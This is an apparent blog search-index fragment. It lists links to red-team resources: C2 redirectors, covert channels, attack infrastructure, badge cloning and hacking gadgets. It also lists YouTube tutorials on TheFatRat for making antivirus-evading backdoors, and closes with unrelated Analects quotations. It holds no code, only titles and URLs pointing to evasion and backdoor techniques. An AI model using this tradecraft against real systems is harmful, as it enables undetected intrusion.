href="http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/">Redirecting Cobalt Strike DNS Beacons</a></li><li><a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup">Apache2Mod Rewrite Setup</a></li><li><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></li><li><a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/">High-reputation Redirectors and Domain Fronting</a></li><li><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/">Cloud-based Redirectors for Distributed Hacking</a></li><li><a href="https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/">Combatting Incident Responders with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/">Operating System Based Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/">Invalid URI Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/">Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection</a></li><li><a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10">mod_rewrite rule to evade vendor sandboxes</a></li><li><a href="https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/">Expire Phishing Links with Apache RewriteMap</a></li><li><a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9">Serving random payloads with NGINX</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html">Mod_Rewrite Automatic Setup</a></li><li><a href="https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html">Hybrid Cobalt Strike Redirectors</a></li><li><a href="https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/">Expand Your Horizon Red Team – Modern SAAS C2</a></li><li><a href="http://threat.tevora.com/automating-redirector-deployment-with-ansible/">RTOps: Automating Redirector Deployment With Ansible</a></li></ul><h3 id="Web-Services"><a href="#Web-Services" class="headerlink" title="Web Services"></a>Web Services</h3><ul><li><a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/">C2 with Dropbox</a></li><li><a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/">C2 with gmail</a></li><li><a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/">C2 with twitter</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/">Office 365 for Cobalt Strike C2</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://securityblog.gr/4434/a-stealthy-python-based-windows-backdoor-that-uses-github-as-a-cc-server/">A stealthy Python based Windows backdoor that uses Github as a C&amp;C server</a></li><li><a href="https://www.cobaltstrike.com/help-externalc2">External C2 (Third-Party Command and Control)</a></li><li><a href="https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/">Cobalt Strike over external C2 – beacon home in the most obscure ways</a></li><li><a href="https://github.com/ryhanson/ExternalC2/">External C2 for Cobalt Strike</a></li><li><a href="http://www.insomniacsecurity.com/2018/01/11/externalc2.html">External C2 framework for Cobalt Strike</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework">External C2 framework - GitHub Repo</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework">Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs</a></li><li><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/">Exploring Cobalt Strike’s ExternalC2 framework</a></li></ul><h3 id="Application-Layer-Protocol"><a href="#Application-Layer-Protocol" class="headerlink" title="Application Layer Protocol"></a>Application Layer Protocol</h3><ul><li><a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/">C2 WebSocket</a></li><li><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/">C2 WMI</a></li><li><a href="https://pentestlab.blog/2017/11/14/command-and-control-website/">C2 Website</a></li><li><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/">C2 Image</a></li><li><a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/">C2 Javascript</a></li><li><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/">C2 WebInterface</a></li><li><a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/">C2 with DNS</a></li><li><a href="https://pentestlab.blog/2017/10/04/command-and-control-https/">C2 with https</a></li><li><a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/">C2 with webdav</a></li><li><a href="https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a">Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool</a></li><li><a href="https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/">InternetExplorer.Application for C2</a></li></ul><h3 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h3><ul><li><a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/">Automated Red Team Infrastructure Deployment with Terraform - Part 1</a></li><li><a href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/">Automated Red Team Infrastructure Deployment with Terraform - Part 2</a></li><li><a href="https://rastamouse.me/2018/02/red-team-infrastructure---aws-encrypted-ebs/">Red Team Infrastructure - AWS Encrypted EBS</a></li><li><a href="https://cybersyndicates.com/2016/11/top-red-team-tips/">6 RED TEAM INFRASTRUCTURE TIPS</a></li><li><a href="https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/">How to Build a C2 Infrastructure with Digital Ocean – Part 1</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">Infrastructure for Ongoing Red Team Operations</a></li><li><a href="https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e">Attack Infrastructure Log Aggregation and Monitoring</a></li><li><a href="https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/">Randomized Malleable C2 Profiles Made Easy</a></li><li><a href="https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/">Migrating Your infrastructure</a></li><li><a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/">ICMP C2</a></li><li><a href="https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/">Using WebDAV features as a covert channel</a></li><li><a href="https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac">Safe Red Team Infrastructure</a></li><li><a href="https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT</a></li><li><a href="http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/">Command and Control Using Active Directory</a></li><li><a href="https://blog.cobaltstrike.com/2013/02/12/a-vision-for-distributed-red-team-operations/">A Vision for Distributed Red Team Operations</a></li><li><a href="https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/">Designing Effective Covert Red Team Attack Infrastructure</a></li><li><a href="https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/">Serving Random Payloads with Apache mod_rewrite</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html">Mail Servers Made Easy</a></li><li><a href="https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/">Securing your Empire C2 with Apache mod_rewrite</a></li><li><a href="https://jordan-wright.com/blog/post/2018-02-04-automating-gophish-releases/">Automating Gophish Releases With Ansible and Docker</a></li><li><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/">How to Write Malleable C2 Profiles for Cobalt Strike</a></li><li><a href="https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-profiles-for-empire/">How to Make Communication Profiles for Empire</a></li><li><a href="http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/">A Brave New World: Malleable C2</a></li><li><a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable Command and Control</a></li></ul><h2 id="↑-Embedded-and-Peripheral-Devices-Hacking"><a href="#↑-Embedded-and-Peripheral-Devices-Hacking" class="headerlink" title="↑ Embedded and Peripheral Devices Hacking"></a><a href="#table-of-contents">↑</a> Embedded and Peripheral Devices Hacking</h2><ul><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Getting-in-with-the-Proxmark-3-and-ProxBrute/">Gettting in with the Proxmark3 &amp; ProxBrute</a></li><li><a href="https://blog.nviso.be/2017/01/11/a-practical-guide-to-rfid-badge-copying/">Practical Guide to RFID Badge copying</a></li><li><a href="https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/">Contents of a Physical Pentester Backpack</a></li><li><a href="https://github.com/samyk/magspoof">MagSpoof - credit card/magstripe spoofer</a></li><li><a href="https://samy.pl/keysweeper/">Wireless Keyboard Sniffer</a></li><li><a href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/">RFID Hacking with The Proxmark 3</a></li><li><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Tutorial_Proxmark_the_Swiss_Army_Knife_for_RFID_Security_Research-RFIDSec12.pdf">Swiss Army Knife for RFID</a></li><li><a href="https://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12_Miller_NFC_attack_surface_WP.pdf">Exploring NFC Attack Surface</a></li><li><a href="http://gerhard.dekoninggans.nl/documents/publications/dekoninggans.phd.thesis.pdf">Outsmarting smartcards</a></li><li><a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/">Reverse engineering HID iClass Master keys</a></li><li><a href="https://www.pwnieexpress.com/aopp">Android Open Pwn Project (AOPP)</a></li></ul><h2 id="↑-Misc"><a href="#↑-Misc" class="headerlink" title="↑ Misc"></a><a href="#table-of-contents">↑</a> Misc</h2><ul><li><a href="https://github.com/vysec/RedTips">Red Tips of Vysec</a></li><li><a href="https://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/">Cobalt Strike Tips for 2016 ccde red teams</a></li><li><a href="https://blog.cobaltstrike.com/2015/07/09/models-for-red-team-operations/">Models for Red Team Operations</a></li><li><a href="https://github.com/magoo/redteam-plan">Planning a Red Team exercise</a></li><li><a href="https://www.youtube.com/watch?v=oclbbqvawQg">Raphael Mudge - Dirty Red Team tricks</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-one-e38e06ffd604">introducing the adversary resilience methodology part 1</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-two-279a1ed7863d">introducing the adversary resilience methodology part 2</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc">Responsible red team</a></li><li><a href="https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/">Red Teaming for Pacific Rim CCDC 2017</a></li><li><a href="https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/">How I Prepared to Red Team at PRCCDC 2015</a></li><li><a href="https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/">Red Teaming for Pacific Rim CCDC 2016</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc">Responsible Red Teams</a></li></ul><h2 id="↑-RedTeam-Gadgets"><a href="#↑-RedTeam-Gadgets" class="headerlink" title="↑ RedTeam Gadgets"></a><a href="#table-of-contents">↑</a> RedTeam Gadgets</h2><h4 id="Network-Implants"><a href="#Network-Implants" class="headerlink" title="Network Implants"></a>Network Implants</h4><ul><li><a href="https://hackerwarehouse.com/product/lan-tap-pro/">LAN Tap Pro</a></li><li><a href="https://hakshop.com/collections/network-implants/products/lan-turtle">LAN Turtle</a></li><li><a href="https://hakshop.com/collections/physical-access/products/bash-bunny">Bash Bunny</a></li><li><a href="https://hakshop.com/products/packet-squirrel">Packet Squirrel</a><h4 id="Wifi-Auditing"><a href="#Wifi-Auditing" class="headerlink" title="Wifi Auditing"></a>Wifi Auditing</h4></li><li><a href="https://hakshop.com/products/wifi-pineapple">WiFi Pineapple</a></li><li><a href="https://hackerwarehouse.com/product/alfa-802-11bgn-long-range-usb-wireless-adapter/">Alpha Long range Wireless USB</a></li><li><a href="https://www.tindie.com/products/lspoplove/dstike-wifi-deauther-monster/">Wifi-Deauth Monster</a></li><li><a href="https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl">Crazy PA</a><h4 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h4></li><li><a href="https://hackerwarehouse.com/product/blekey/">BLE Key</a></li><li><a href="https://hackerwarehouse.com/product/proxmark3-kit/">Proxmark3</a></li><li><a href="https://www.attify-store.com/products/zigbee-sniffing-tool-atmel-rzraven">Zigbee Sniffer</a></li><li><a href="https://www.attify-store.com/collections/frontpage/products/jtag-exploitation-kit-with-lab-manual">Attify IoT Exploit kit</a><h4 id="Software-Defined-Radio-SDR"><a href="#Software-Defined-Radio-SDR" class="headerlink" title="Software Defined Radio - SDR"></a>Software Defined Radio - SDR</h4></li><li><a href="https://hackerwarehouse.com/product/hackrf-one-kit/">HackRF One Bundle</a></li><li><a href="https://hackerwarehouse.com/product/rtlsdr/">RTL-SDR</a></li><li><a href="https://hackerwarehouse.com/product/yard-stick-one-kit/">YARD stick one Bundle</a></li><li><a href="https://hackerwarehouse.com/product/ubertooth-one/">Ubertooth</a><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4></li><li><a href="https://hackerwarehouse.com/product/keygrabber/">Key Grabber</a></li><li><a href="https://store.ryscc.com/products/magspoof%20">Magspoof</a></li><li><a href="https://samy.pl/poisontap/">Poison tap</a></li><li><a href="https://samy.pl/keysweeper/">keysweeper</a></li><li><a href="https://hakshop.com/collections/physical-access/products/usb-rubber-ducky-deluxe">USB Rubber Ducky</a></li></ul><h2 id="↑-Ebooks"><a href="#↑-Ebooks" class="headerlink" title="↑ Ebooks"></a><a href="#table-of-contents">↑</a> Ebooks</h2><ul><li><a href="https://www.amazon.com/Next-Generation-Teaming-Henry-Dalziel/dp/0128041714">Next Generation Red Teaming</a></li><li><a href="https://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits/dp/0128006048">Targeted Cyber Attack</a></li><li><a href="https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689">Advanced Penetration Testing: Hacking the World’s Most Secure Networks</a></li><li><a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/">Social Engieers’ Playbook Pretical Pretexting</a></li></ul><h2 id="↑-Training-Free"><a href="#↑-Training-Free" class="headerlink" title="↑ Training ( Free )"></a><a href="#table-of-contents">↑</a> Training ( Free )</h2><ul><li><a href="https://www.youtube.com/watch?v=IRpS7oZ3z0o&list=PL9HO6M_MU2nesxSmhJjEvwLhUoHPHmXvz">Tradecraft - a course on red team operations</a></li><li><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/">Advanced Threat Tactics Course &amp; Notes</a></li></ul><h2 id="↑-Certification"><a href="#↑-Certification" class="headerlink" title="↑ Certification"></a><a href="#table-of-contents">↑</a> Certification</h2><ul><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-specialist/">CREST Certified Simulated Attack Specialist</a></li><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-manager/">CREST Certified Simulated Attack Manager</a></li><li><a href="https://www.sans.org/course/red-team-operations-and-threat-emulation">SEC564: Red Team Operations and Threat Emulation</a></li><li><a href="https://www.elearnsecurity.com/course/penetration_testing_extreme/">ELearn Security Penetration Testing eXtreme</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TheFatRat YouTube 视频</title>
      <link href="/2021/06/08/bypass-av.htm"/>
      <url>/2021/06/08/bypass-av.htm</url>
      
        <content type="html"><![CDATA[<p>TheFatRat</p><span id="more"></span><ul><li>Screetsec Channel : <a href="https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw">https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw</a></li><li>Udate thefatrat v1.8 <a href="https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8">https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>file Pumper in linux with fatrat <a href="https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8">https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :<a href="https://www.youtube.com/watch?v=mkfKSCxvPec">https://www.youtube.com/watch?v=mkfKSCxvPec</a></li><li>Embed Backdoor Apk Andoird : <a href="https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be">https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be</a></li><li>Create Backdoor Php and Reconnect With TheFatRat : <a href="https://www.youtube.com/watch?v=gfS55fjd8Fg">https://www.youtube.com/watch?v=gfS55fjd8Fg</a></li><li>THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : <a href="https://www.youtube.com/watch?v=C4YHVKPw6Zo">https://www.youtube.com/watch?v=C4YHVKPw6Zo</a></li><li>Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : <a href="https://www.youtube.com/watch?v=-WbKOxIl_f4">https://www.youtube.com/watch?v=-WbKOxIl_f4</a></li><li>How to hack android device with FatRat on kali linux 2 :<a href="https://www.youtube.com/watch?v=yUuwnu-NUXE">https://www.youtube.com/watch?v=yUuwnu-NUXE</a></li><li>Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : <a href="https://www.youtube.com/watch?v=7PMfPbrM0o4">https://www.youtube.com/watch?v=7PMfPbrM0o4</a></li><li>FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=8lJBwclFwJI">https://www.youtube.com/watch?v=8lJBwclFwJI</a></li><li>FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s">https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s</a></li><li>FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=wCzsD6vt9CQ">https://www.youtube.com/watch?v=wCzsD6vt9CQ</a></li><li>TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :<a href="https://www.youtube.com/watch?v=wuOCDn0NvWc">https://www.youtube.com/watch?v=wuOCDn0NvWc</a></li><li>1000 % FUD Backdoor with TheFatRat Tool : <a href="https://www.youtube.com/watch?v=vPXWv0jaBEQ">https://www.youtube.com/watch?v=vPXWv0jaBEQ</a></li><li>How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdoor (Virus) 100% Indetectable | TheFatRat : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :<a href="https://www.youtube.com/watch?v=1SQW9lujjT8">https://www.youtube.com/watch?v=1SQW9lujjT8</a></li><li>Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 <a href="https://www.youtube.com/watch?v=FlXMslSjnGw">https://www.youtube.com/watch?v=FlXMslSjnGw</a></li><li>TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) <a href="https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8">https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>ALL VIDEO IN HERE : <a href="https://www.youtube.com/results?search_query=thefatrat+backdoor">https://www.youtube.com/results?search_query=thefatrat+backdoor</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> bypass-av </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> bypass-av </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论语十则</title>
      <link href="/2017/12/07/index.htm"/>
      <url>/2017/12/07/index.htm</url>
      
        <content type="html"><![CDATA[<h1 id="《论语·十则》"><a href="#《论语·十则》" class="headerlink" title="《论语·十则》"></a>《论语·十则》</h1><h2 id="子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”"><a href="#子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”" class="headerlink" title="子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”"></a>子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”</h2><h3 id="曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？”"><a href="#曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？”" class="headerlink" title="曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？”"></a>曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？”</h3><span id="more"></span><ul><li>子曰：“温故而知新，可以为师矣。”</li><li>子曰：“学而不思则罔，思而不学则殆。”</li></ul><ol><li>子曰：“由，诲女知之乎！知之为知之，不知为不知，是知也。”</li><li>子曰：“见贤思齐焉，见不贤而内自省也。”<blockquote><p>子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。”</p></blockquote></li></ol><p><strong>曾子曰</strong>：<em>“士不可以不弘毅，任重而道远。仁以为己任，不亦重乎？死而后已，不亦远乎？”</em><br><code>子曰：“岁寒，然后知松柏之后凋也。”</code></p><hr><pre><code>子贡问曰：“有一言而可以终身行之者乎？”子曰：“其恕乎！己所不欲，勿施于人。”</code></pre><center>![](/uploads/Apple1.png)</center>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文学 </tag>
            
            <tag> 省身 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
